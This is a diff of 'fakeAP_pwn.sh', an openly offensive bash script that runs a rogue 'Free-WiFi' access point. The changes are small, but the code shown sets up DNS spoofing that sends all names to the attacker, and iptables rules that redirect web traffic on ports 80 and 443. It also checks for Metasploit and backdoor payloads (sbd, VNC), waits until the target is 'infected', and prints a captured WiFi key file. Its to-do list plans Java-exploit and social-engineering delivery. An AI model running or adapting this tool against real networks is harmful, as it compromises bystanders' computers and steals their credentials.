@@ -1,24 +1,24 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh (v0.3-RC17 2010-07-11)                                                         #
+# fakeAP_pwn.sh (v0.3-RC18 2010-07-11)                                                         #
 #----------------------------------------------------------------------------------------------#
-# Make sure to copy "www": cp -rf www/* $htdocs_folder/                                        #
+# Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
 #----------------------------------------------------------------------------------------------#
 #ToDo List:                                                                                    #
-# v0.3 - Give "index.php" a makeover                                                           #
 # v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
 #                           crafted page without affecting any other clients who are browsing  #
 #                           Create a radius server with:                                       #
-#				-CoovaChilli                                                   #
-#				-FreeRadius                                                    #
-#				-MySQL                                                         #                                      
+#                               -CoovaChilli                                                   #
+#                               -FreeRadius                                                    #
+#                               -MySQL                                                         #
 # v0.4 - Firewall Rules   - Don't expose local machines from the internet interface            #
 # v0.5 - Java exploit     - Different "delivery system" ;)                                     #
 # v0.6 - Linux/OSX/x64    - Make compatible                                                    #
+# v0.7 - SET              - Social Engineering Toolkit                                         #
 # Monitor traffic         - That isn't on port 80 before they download the payload             #
 # Metasploit "fun"        - Automate a few more "things"                                       #
-#                                                                                              #
+# apt-get install hostapd                                                                      #
 #----------------------------------------------------------------------------------------------#
 # Defaults *****~~~Change theses~~~*****
 export            ESSID="Free-WiFi"                  # WiFi Name of the fake network.
@@ -42,7 +42,7 @@ export          verbose=0                            # 0/1/2      - Verbose mode
 export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
 export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
 export      port=`shuf -i 2000-65000 -n 1`
-export   version="0.3-RC17"
+export   version="0.3-RC18"
 trap 'cleanup' 2 # Interrupt - "Ctrl + C"
 #-----------------------------------------------------------------------------------------------
 function cleanup() {
@@ -53,7 +53,6 @@ function cleanup() {
       if test -e /tmp/fakeAP_pwn.dns;   then rm /tmp/fakeAP_pwn.dns; fi
       if test -e /tmp/fakeAP_pwn.dhcp;  then rm /tmp/fakeAP_pwn.dhcp; fi
       if test -e /tmp/fakeAP_pwn.wkv;   then rm /tmp/fakeAP_pwn.wkv; fi
-
       if test -e /tmp/fakeAP_pwn.lock;  then rm /tmp/fakeAP_pwn.lock; fi
       if test -e dsniff.services;       then rm dsniff.services; fi
       if test -e sslstrip.log;          then rm sslstrip.log; fi
@@ -81,6 +80,7 @@ function help() {
  Usage: bash fakeAP_pwn.sh -e [ESSID] -c [channel] -i [interface] -w [interface]
              -m [interface]  -p [sbd/vnc/other] -b [/path] -s [/path] -h [/path] -t [MTU]
              -n -r -z -e -d -v -V [-u] [-?]
+
  Common options:
    -e  ---  WiFi Name e.g. Free-WiFi
    -c  ---  Set the channel for the FakeAP to run on
@@ -103,17 +103,25 @@ function help() {
    -d  ---  Debug Mode (Doesnt close any pop up windows)
    -v  ---  Verbose mode (Displays exactly whats going on.)
    -V  ---  Higher level of Verbose
-   -u  ---  Update FakeAP_pwn [*]
+   -u  ---  Update FakeAP_pwn
    -?  ---  This screen
+
+ Known issues:
+   - Slowness
+        Try a different MTU value?
+   - No IP
+        Try...
+   - Wireless N
+        Doesn't work too well!
 "
    exit 1
 }
 function update() {
-   #svn checkout http://fakeap-pwn.googlecode.com/svn/ ./
+   #svn checkout http://fakeap-pwn.googlecode.com/svn/
    #svn update
    #wget http://fakeap-pwn.googlecode.com/ fakeAP_pwn.tar.gz
 
-   svn export http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh fakeAP_pwn.sh
+   svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh fakeAP_pwn.sh
    echo -e "\e[01;36m[>]\e[00m Updated!" # Now using v$version_new."
    exit 2
 }
@@ -215,7 +223,7 @@ if ! test -e /usr/sbin/apache2; then   echo -e "\e[00;31m[-]\e[00m apache2 isn't
 if ! test -e /usr/bin/macchanger; then echo -e "\e[00;31m[-]\e[00m macchanger isn't installed. Try: apt-get install macchanger"; cleanup; fi
 if ! test -e /usr/sbin/dhcpd3; then    echo -e "\e[00;31m[-]\e[00m dhcpd3 isn't installed. Try: apt-get install dhcp3-server"; cleanup; fi
 if ! test -e /usr/sbin/dnsspoof; then  echo -e "\e[00;31m[-]\e[00m dnsspoof isn't installed. Try: apt-get install dsniff"; cleanup; fi
-if ! [ -d "$metasploitPath" ]; then    echo -e "\e[00;31m[-]\e[00m Metasploit isn't at $metasploitPath. Try: apt-get install metasploit OR apt-get install framework3"; cleanup; fi
+if ! [ -d "$metasploitPath" ]; then    echo -e "\e[00;31m[-]\e[00m metasploit isn't at $metasploitPath. Try: apt-get install metasploit OR apt-get install framework3"; cleanup; fi
 if [ "$payload" == "other" ]; then
    if ! [ -e "$backdoorPath" ]; then
       echo -e "\e[00;31m[-]\e[00m There isn't a backdoor at $backdoorPath."
@@ -246,7 +254,7 @@ $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Apache2 Service'
 if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/wicd stop"; fi
 $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'WICD Service'" -e "/etc/init.d/wicd stop"                       # Stopping WICD
 #if [ "$verbose" == "2" ] ; then echo "[i] Command: service network-manager stop"; fi
-#$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'network-manager'" -e "service network-manager stop"            # Stopping network-manager (only for Ubuntu) 
+#$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'network-manager'" -e "service network-manager stop"            # Stopping network-manager (only for Ubuntu)
 
 echo -e "\e[01;32m[>]\e[00m Setting up wireless card..."
 if [ "$verbose" == "2" ] ; then echo "[i] Command: airmon-ng stop $monitorInterface"; fi
@@ -427,8 +435,8 @@ subnet 10.0.0.0 netmask 255.255.255.0 {
 if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.rb"; fi
 if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.dhcp; fi
 
+# dns script
 if [ "$transparent" != "true" ]; then
-   # dns script
    echo "10.0.0.1 *" > /tmp/fakeAP_pwn.dns
    if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.dns"; fi
    if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.dns; fi
@@ -565,11 +573,10 @@ if [ "$transparent" != "true" ]; then
    echo -e "\e[01;32m[>]\e[00m Starting DNS services..."
    if [ "$verbose" == "2" ] ; then echo "[i] Command: dnsspoof -i at0 -f /tmp/fakeAP_pwn.dns"; fi
    $xterm -geometry 75x3+10+145 -T "fakeAP_pwn v$version - FakeDNS" -e "dnsspoof -i at0 -f /tmp/fakeAP_pwn.dns" &
-   #$xterm -geometry 75x3+10+145 -T "fakeAP_pwn v$version - FakeDNS" -e "$metasploitPath/msfconsole -r /tmp/fakeAP_pwn.rc" &
    sleep 7
 fi
 
-#echo -e "\e[01;32m[>]\e[00m Starting SSLStrip..." 
+#echo -e "\e[01;32m[>]\e[00m Starting SSLStrip..."
 #if [ "$verbose" == "2" ] ; then echo "[i] Command: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"; fi
 #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 #if [ "$verbose" == "2" ] ; then echo "[i] Command: sslstrip -k -f -l 10000"; fi
@@ -615,7 +622,7 @@ iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 
 iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1
 sleep 1
 
-# Wait till user is connected (Its checks for a file to be created from fakeAP_pwn.rb via metasploit)
+# Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
 echo -e "\e[01;33m[*]\e[00m Waiting for target to connect..."
 if test -e /tmp/fakeAP_pwn.lock; then rm -r /tmp/fakeAP_pwn.lock; fi
 while [ ! -e /tmp/fakeAP_pwn.lock ]; do
@@ -638,7 +645,7 @@ if [ "$transparent" == "true" ]; then
 fi
 
 if [ "$payload" == "wkv" ]; then
-   echo -e "\e[00;31m[i] Opening WiFi Key file...."
+   echo -e "\e[00;31m[i] Opening file...."
    cat /tmp/fakeAP_pwn.wkv
    sleep 1
 fi
